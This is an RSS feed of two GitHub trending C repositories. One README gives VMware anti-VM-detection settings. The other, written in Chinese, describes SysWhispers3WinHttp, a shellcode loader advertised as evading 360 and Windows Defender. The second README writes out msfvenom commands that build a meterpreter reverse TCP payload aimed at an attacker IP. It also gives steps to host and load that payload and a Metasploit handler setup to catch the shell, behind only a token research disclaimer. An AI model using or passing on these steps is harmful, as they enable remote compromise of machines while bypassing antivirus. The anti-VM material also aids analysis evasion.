<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-04-25T01:31:45Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>hzqst/VmwareHardenedLoader</title>
    <updated>2023-04-25T01:31:45Z</updated>
    <id>tag:github.com,2023-04-25:/hzqst/VmwareHardenedLoader</id>
    <link href="https://github.com/hzqst/VmwareHardenedLoader" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Vmware Hardened VM detection mitigation loader (anti anti-vm)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;VMwareHardenedLoader&lt;/h1&gt; &#xA;&lt;p&gt;VMware Hardened VM detection mitigation loader&lt;/p&gt; &#xA;&lt;p&gt;For now, only Windows (vista~win10) x64 guests are supported.&lt;/p&gt; &#xA;&lt;p&gt;It get VMware guest undetected by VMProtect 3.2, Safengine and Themida (anti-vm feature).&lt;/p&gt; &#xA;&lt;h2&gt;What it does&lt;/h2&gt; &#xA;&lt;p&gt;The VmLoader driver patches SystemFirmwareTable at runtime, it removes all detectable signatures like &#34;VMware&#34; &#34;Virtual&#34; &#34;VMWARE&#34;.&lt;/p&gt; &#xA;&lt;h2&gt;Build&lt;/h2&gt; &#xA;&lt;p&gt;Visual Studio 2015 / 2017 and &lt;a href=&#34;https://docs.microsoft.com/zh-cn/windows-hardware/drivers/download-the-wdk&#34;&gt;Windows Driver Kit 10&lt;/a&gt; are required.&lt;/p&gt; &#xA;&lt;p&gt;Open VmLoader.sln with Visual Studio 2015 / 2017&lt;/p&gt; &#xA;&lt;p&gt;Build VmLoader as x64/Release. (No x86 support for now)&lt;/p&gt; &#xA;&lt;p&gt;Remember to test-sign &#34;bin/vmloader.sys&#34; if you want to load it in test-sign mode.&lt;/p&gt; &#xA;&lt;h1&gt;Installation&lt;/h1&gt; &#xA;&lt;h2&gt;Warning&lt;/h2&gt; &#xA;&lt;p&gt;Do not install vmtools, it will ruin everything!&lt;/p&gt; &#xA;&lt;p&gt;Use TeamViewer / AnyDesk / mstsc / VNC viewer instead!&lt;/p&gt; &#xA;&lt;h2&gt;1st Step: Add following settings into .vmx&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;hypervisor.cpuid.v0 = &#34;FALSE&#34;&#xA;board-id.reflectHost = &#34;TRUE&#34;&#xA;hw.model.reflectHost = &#34;TRUE&#34;&#xA;serialNumber.reflectHost = &#34;TRUE&#34;&#xA;smbios.reflectHost = &#34;TRUE&#34;&#xA;SMBIOS.noOEMStrings = &#34;TRUE&#34;&#xA;isolation.tools.getPtrLocation.disable = &#34;TRUE&#34;&#xA;isolation.tools.setPtrLocation.disable = &#34;TRUE&#34;&#xA;isolation.tools.setVersion.disable = &#34;TRUE&#34;&#xA;isolation.tools.getVersion.disable = &#34;TRUE&#34;&#xA;monitor_control.disable_directexec = &#34;TRUE&#34;&#xA;monitor_control.disable_chksimd = &#34;TRUE&#34;&#xA;monitor_control.disable_ntreloc = &#34;TRUE&#34;&#xA;monitor_control.disable_selfmod = &#34;TRUE&#34;&#xA;monitor_control.disable_reloc = &#34;TRUE&#34;&#xA;monitor_control.disable_btinout = &#34;TRUE&#34;&#xA;monitor_control.disable_btmemspace = &#34;TRUE&#34;&#xA;monitor_control.disable_btpriv = &#34;TRUE&#34;&#xA;monitor_control.disable_btseg = &#34;TRUE&#34;&#xA;monitor_control.restrict_backdoor = &#34;TRUE&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you have a SCSI virtual disk at scsi0 slot (first slot) as your system drive, remember to add&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;scsi0:0.productID = &#34;Whatever you want&#34;&#xA;scsi0:0.vendorID = &#34;Whatever you want&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;I use&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;scsi0:0.productID = &#34;Tencent SSD&#34;&#xA;scsi0:0.vendorID = &#34;Tencent&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;2nd Step: Modify MAC address&lt;/h2&gt; &#xA;&lt;p&gt;Modify guest&#39;s MAC address to whatever except below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&#x9;TCHAR *szMac[][2] = {&#xA;&#x9;&#x9;{ _T(&#34;\x00\x05\x69&#34;), _T(&#34;00:05:69&#34;) }, // VMWare, Inc.&#xA;&#x9;&#x9;{ _T(&#34;\x00\x0C\x29&#34;), _T(&#34;00:0c:29&#34;) }, // VMWare, Inc.&#xA;&#x9;&#x9;{ _T(&#34;\x00\x1C\x14&#34;), _T(&#34;00:1C:14&#34;) }, // VMWare, Inc.&#xA;&#x9;&#x9;{ _T(&#34;\x00\x50\x56&#34;), _T(&#34;00:50:56&#34;) },&#x9;// VMWare, Inc.&#xA;&#x9;};&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/hzqst/VmwareHardenedLoader/raw/master/img/4.png&#34; alt=&#34;mac&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;You could add&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;ethernet0.address = &#34;Some random mac address&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Into vmx file instead of modifying MAC address in VMware GUI&lt;/p&gt; &#xA;&lt;p&gt;I use&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;ethernet0.address = &#34;00:11:56:20:D2:E8&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;3rd Step: Run install.bat in vm guest as Administrator Priviledge&lt;/h2&gt; &#xA;&lt;p&gt;If an error occurs when start service, use DbgView to capture kernel debug output. you can post an issue with DbgView output information and with your ntoskrnl.exe attached.&lt;/p&gt; &#xA;&lt;p&gt;If no error occurs, then everything works fine.&lt;/p&gt; &#xA;&lt;h2&gt;Showcase&lt;/h2&gt; &#xA;&lt;p&gt;VMware guest win8.1 x64 with VMProtect 3.2 packed program (anti-vm option enabled)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/hzqst/VmwareHardenedLoader/raw/master/img/1.png&#34; alt=&#34;before&#34;&gt; &lt;img src=&#34;https://github.com/hzqst/VmwareHardenedLoader/raw/master/img/2.png&#34; alt=&#34;sigs&#34;&gt; &lt;img src=&#34;https://github.com/hzqst/VmwareHardenedLoader/raw/master/img/3.png&#34; alt=&#34;after&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This software is released under the MIT License, see LICENSE.&lt;/p&gt; &#xA;&lt;p&gt;Some util procedures are from &lt;a href=&#34;https://github.com/tandasat/HyperPlatform&#34;&gt;https://github.com/tandasat/HyperPlatform&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/aquynh/capstone&#34;&gt;https://github.com/aquynh/capstone&lt;/a&gt; is used to disasm ntoskrnl code.&lt;/p&gt; &#xA;&lt;h2&gt;TODO&lt;/h2&gt; &#xA;&lt;p&gt;VMware virtual graphic card information could be detected by querying DXGI interface, which could be modified by editing graphic driver files.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>huaigu4ng/SysWhispers3WinHttp</title>
    <updated>2023-04-25T01:31:45Z</updated>
    <id>tag:github.com,2023-04-25:/huaigu4ng/SysWhispers3WinHttp</id>
    <link href="https://github.com/huaigu4ng/SysWhispers3WinHttp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;SysWhispers3WinHttp 基于SysWhispers3项目增添WinHttp分离加载功能，可免杀绕过360核晶与Defender。&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SysWhispers3WinHttp&lt;/h1&gt; &#xA;&lt;p&gt;SysWhispers3WinHttp 基于SysWhispers3项目增添WinHttp分离加载功能，可免杀绕过360核晶与Defender。&lt;/p&gt; &#xA;&lt;h2&gt;0x01 免责声明：&lt;/h2&gt; &#xA;&lt;p&gt;该项目仅供安全研究使用，禁止使用该项目进行违法操作，否则由使用者承担全部法律及连带责任。&lt;/p&gt; &#xA;&lt;h2&gt;0x02 使用：&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;// 1. 使用msfvenom生成shellcode（或使用CobaltStrike生成Stageless之Shellcode）&#xA;msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.1.104 lport=4444 -f raw -o beacon.bin&#xA;&#xA;// 2. 使用python3开启Web服务（或使用CobaltStrike之HostFile功能）&#xA;python3 -m http.server&#xA;&#xA;// 3. 修改SysWhispers3WinHttp.c第40行IP地址并使用Linux32位GCC进行交叉编译&#xA;i686-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls.c SysWhispers3WinHttp.c -masm=intel -fpermissive -w -s -lwinhttp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;注：Windows下也可编译，GCC下载地址为 &lt;a href=&#34;https://master.dl.sourceforge.net/project/mingw-w64/Toolchains%20targetting%20Win32/Personal%20Builds/mingw-builds/6.4.0/threads-win32/sjlj/i686-6.4.0-release-win32-sjlj-rt_v5-rev0.7z?viasf=1&#34;&gt;https://master.dl.sourceforge.net/project/mingw-w64/Toolchains%20targetting%20Win32/Personal%20Builds/mingw-builds/6.4.0/threads-win32/sjlj/i686-6.4.0-release-win32-sjlj-rt_v5-rev0.7z?viasf=1&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;0x03 演示：&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;msfconsole&#xA;msf6 &amp;gt; use exploit/multi/handler &#xA;msf6 exploit(multi/handler) &amp;gt; set payload windows/meterpreter_reverse_tcp&#xA;msf6 exploit(multi/handler) &amp;gt; set lhost 0.0.0.0&#xA;msf6 exploit(multi/handler) &amp;gt; set lport 4444&#xA;msf6 exploit(multi/handler) &amp;gt; run&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;360核晶截图（2023/04/23更新） &lt;img src=&#34;https://user-images.githubusercontent.com/128464183/233817661-76d09fef-7817-4e5a-a236-871c4a300471.PNG&#34; alt=&#34;360&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Defender截图 &lt;img src=&#34;https://user-images.githubusercontent.com/128464183/227820977-8ae3dd14-76f4-4076-85a4-91ff2702ec61.PNG&#34; alt=&#34;WDdemo&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;微步云沙箱截图 &lt;img src=&#34;https://user-images.githubusercontent.com/128464183/233817665-3ff36fed-ec4e-442f-b837-18247edff7ee.PNG&#34; alt=&#34;threatbook&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;0x04 参考：&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/klezVirus/SysWhispers3&#34;&gt;https://github.com/klezVirus/SysWhispers3&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/zh-cn/windows/win32/api/winhttp/nf-winhttp-winhttpconnect&#34;&gt;https://learn.microsoft.com/zh-cn/windows/win32/api/winhttp/nf-winhttp-winhttpconnect&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>